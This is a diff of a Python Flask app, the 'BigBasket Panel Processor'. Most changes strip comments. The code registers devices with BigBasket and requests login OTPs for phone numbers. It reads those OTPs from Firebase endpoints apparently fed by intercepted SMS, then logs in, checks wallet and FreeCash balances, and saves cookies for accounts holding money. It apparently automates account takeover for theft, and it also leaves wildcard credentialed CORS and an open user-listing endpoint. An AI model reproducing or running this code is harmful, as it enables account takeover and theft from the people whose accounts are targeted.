@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-BigBasket Panel Processor - User Isolated (Different logs for different users)
-Each user gets their own private room, session storage, and logs
+BigBasket Panel Processor - User Isolated
+Different logs for different users/IPs
 """
 
 import os
@@ -20,7 +20,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from functools import wraps
 
 import requests
-from flask import Flask, request, jsonify, send_file, session
+from flask import Flask, request, jsonify, send_file, session, send_from_directory
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit, join_room, leave_room
 
@@ -45,15 +45,13 @@ logger = logging.getLogger(__name__)
 # ============================================================
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
-app.config['SESSION_COOKIE_SECURE'] = False  # Set to True in production with HTTPS
+app.config['SESSION_COOKIE_SECURE'] = False
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
-app.config['PERMANENT_SESSION_LIFETIME'] = 86400  # 24 hours
+app.config['PERMANENT_SESSION_LIFETIME'] = 86400
 
-# CORS - Allow all origins with credentials
 CORS(app, supports_credentials=True, origins="*")
 
-# SocketIO with user rooms
 socketio = SocketIO(
     app, 
     cors_allowed_origins="*", 
@@ -69,14 +67,12 @@ BASE_SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "se
 os.makedirs(BASE_SESSIONS_DIR, exist_ok=True)
 
 def get_user_sessions_dir(user_id: str) -> str:
-    """Get user-specific sessions directory"""
     user_dir = os.path.join(BASE_SESSIONS_DIR, user_id)
     os.makedirs(user_dir, exist_ok=True)
     return user_dir
 
 def save_user_session(user_id: str, phone: str, device_id: str, panel_url: str, 
                        wallet: float, freecash: float, cookies_data: dict = None):
-    """Save successful session to user's directory"""
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     session_data = {
         'phone': phone,
@@ -90,13 +86,11 @@ def save_user_session(user_id: str, phone: str, device_id: str, panel_url: str,
     
     user_dir = get_user_sessions_dir(user_id)
     
-    # Save individual session file
     filename = f"{phone}_{timestamp}.json"
     filepath = os.path.join(user_dir, filename)
     with open(filepath, 'w') as f:
         json.dump(session_data, f, indent=2)
     
-    # Also append to user's master log
     master_file = os.path.join(user_dir, "all_sessions.json")
     try:
         with open(master_file, 'r') as f:
@@ -111,7 +105,6 @@ def save_user_session(user_id: str, phone: str, device_id: str, panel_url: str,
     return filepath
 
 def get_user_sessions(user_id: str) -> List[Dict]:
-    """Get all sessions for a user"""
     master_file = os.path.join(get_user_sessions_dir(user_id), "all_sessions.json")
     try:
         with open(master_file, 'r') as f:
@@ -120,13 +113,12 @@ def get_user_sessions(user_id: str) -> List[Dict]:
         return []
 
 # ============================================================
-# USER STATE - Isolated per user
+# USER STATE
 # ============================================================
 user_processing_states = {}
 user_states_lock = threading.Lock()
 
 def get_user_state(user_id: str) -> Dict:
-    """Get or create user's processing state"""
     with user_states_lock:
         if user_id not in user_processing_states:
             user_processing_states[user_id] = {
@@ -146,7 +138,6 @@ def get_user_state(user_id: str) -> Dict:
         return user_processing_states[user_id]
 
 def cleanup_old_states():
-    """Clean up old user states (older than 1 hour)"""
     with user_states_lock:
         current_time = datetime.now()
         to_remove = []
@@ -560,7 +551,7 @@ def fetch_otp_from_firebase(firebase_url: str, client_id: str, timeout: int = OT
     return None
 
 # ============================================================
-# PROCESSING ENGINE - USER ISOLATED
+# PROCESSING ENGINE
 # ============================================================
 def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int, 
                    user_id: str, socketio_instance) -> Dict:
@@ -580,7 +571,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
     try:
         client = BigBasketClient(silent=True)
         
-        # Register device
         reg_ok = False
         for attempt in range(MAX_RETRIES):
             if client.register_device():
@@ -592,7 +582,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             result['message'] = 'Registration failed'
             return result
         
-        # Load UI
         ui_ok = False
         for attempt in range(MAX_RETRIES):
             if client.load_ui_data():
@@ -604,7 +593,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             result['message'] = 'UI load failed'
             return result
         
-        # Update device info
         info_ok = False
         for attempt in range(MAX_RETRIES):
             if client.update_device_info():
@@ -616,7 +604,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             result['message'] = 'Device info update failed'
             return result
         
-        # Clean phone number
         clean_phone = re.sub(r'[^0-9]', '', phone)
         if len(clean_phone) == 12 and clean_phone.startswith('91'):
             clean_phone = clean_phone[2:]
@@ -625,7 +612,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             result['message'] = 'Invalid phone number'
             return result
         
-        # Request OTP
         socketio_instance.emit('log', {'message': f"{prefix} Requesting OTP...", 'type': 'info'}, room=user_id)
         otp_sent = client.request_otp(clean_phone)
         if not otp_sent:
@@ -640,7 +626,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             socketio_instance.emit('log', {'message': f"{prefix} OTP failed", 'type': 'error'}, room=user_id)
             return result
         
-        # Wait for OTP
         socketio_instance.emit('log', {'message': f"{prefix} Waiting for OTP...", 'type': 'info'}, room=user_id)
         otp = fetch_otp_from_firebase(firebase_url, client_id, OTP_TIMEOUT)
         
@@ -652,7 +637,6 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
         
         socketio_instance.emit('log', {'message': f"{prefix} OTP received", 'type': 'success'}, room=user_id)
         
-        # Verify OTP
         socketio_instance.emit('log', {'message': f"{prefix} Verifying...", 'type': 'info'}, room=user_id)
         verify_ok = client.verify_otp(clean_phone, otp)
         if not verify_ok:
@@ -663,19 +647,16 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
         
         socketio_instance.emit('log', {'message': f"{prefix} Logged in!", 'type': 'success'}, room=user_id)
         
-        # Get wallet
         socketio_instance.emit('log', {'message': f"{prefix} Fetching wallet...", 'type': 'info'}, room=user_id)
         wallet = client.get_wallet_details()
         balance = wallet.get('current_wallet_balance', 0) if wallet else 0
         result['wallet'] = round(balance) if balance > 0 else 0
         
-        # Get FreeCash
         socketio_instance.emit('log', {'message': f"{prefix} Fetching FreeCash...", 'type': 'info'}, room=user_id)
         freecash_data = client.get_free_cash()
         freecash = freecash_data.get('total_freecash_amount', 0) if freecash_data else 0
         result['freecash'] = round(freecash) if freecash > 0 else 0
         
-        # Save session if cash found - USER SPECIFIC
         if balance > 0 or freecash > 0:
             cookies = {}
             try:
@@ -683,7 +664,7 @@ def process_device(phone: str, client_id: str, firebase_url: str, panel_idx: int
             except:
                 pass
             
-            saved_file = save_user_session(
+            save_user_session(
                 user_id=user_id,
                 phone=clean_phone,
                 device_id=client_id,
@@ -756,7 +737,6 @@ def process_panel_devices(devices: List[Dict], panel_idx: int, user_id: str, soc
                 
                 user_state['processed_devices'] += 1
                 
-                # Update stats
                 cash_count = len(user_state['cash_results'])
                 total_wallet = sum(r.get('wallet', 0) for r in user_state['cash_results'])
                 total_freecash = sum(r.get('freecash', 0) for r in user_state['cash_results'])
@@ -795,7 +775,6 @@ def run_panel_processor(panels: List[str], user_id: str, socketio_instance):
     
     socketio_instance.emit('start', {'message': f'Processing {len(panels)} panels...'}, room=user_id)
     
-    # Extract all URLs
     all_panel_urls = []
     for raw_panel in panels:
         url = parse_panel_link(raw_panel)
@@ -939,7 +918,6 @@ def index():
 
 @app.route('/api/user_id', methods=['GET'])
 def get_user_id():
-    """Get or create a unique user ID"""
     if 'user_id' not in session:
         session['user_id'] = str(uuid.uuid4())
     
@@ -1023,7 +1001,6 @@ def export_results():
 
 @app.route('/api/sessions', methods=['GET'])
 def list_sessions():
-    """List all saved sessions for the current user"""
     user_id = session.get('user_id')
     if not user_id:
         return jsonify({'error': 'No user session'}), 400
@@ -1033,8 +1010,6 @@ def list_sessions():
 
 @app.route('/api/users', methods=['GET'])
 def list_users():
-    """List all active users (admin only)"""
-    # Add admin check here if needed
     with user_states_lock:
         users = {}
         for user_id, state in user_processing_states.items():
@@ -1054,13 +1029,11 @@ def list_users():
 # ============================================================
 @socketio.on('connect')
 def handle_connect():
-    """User joins their private room"""
     user_id = session.get('user_id')
     if not user_id:
         user_id = str(uuid.uuid4())
         session['user_id'] = user_id
     
-    # Update user info
     user_state = get_user_state(user_id)
     user_state['ip'] = request.remote_addr
     user_state['user_agent'] = request.headers.get('User-Agent', '')
@@ -1075,21 +1048,13 @@ def handle_disconnect():
         leave_room(user_id)
 
 # ============================================================
-# HTML INDEX
-# ============================================================
-@app.route('/index.html')
-def serve_index():
-    return send_from_directory('.', 'index.html')
-
-# ============================================================
 # MAIN
 # ============================================================
 if __name__ == '__main__':
     # Clean up old states periodically
-    import threading
     def cleanup_thread():
         while True:
-            time.sleep(300)  # Every 5 minutes
+            time.sleep(300)
             cleanup_old_states()
     
     cleanup = threading.Thread(target=cleanup_thread, daemon=True)
@@ -1109,4 +1074,5 @@ if __name__ == '__main__':
     print("  📊 Active users: /api/users")
     print("="*60)
     
-    socketio.run(app, host='0.0.0.0', port=port, debug=False)
+    # Use Werkzeug with allow_unsafe_werkzeug=True for Render
+    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
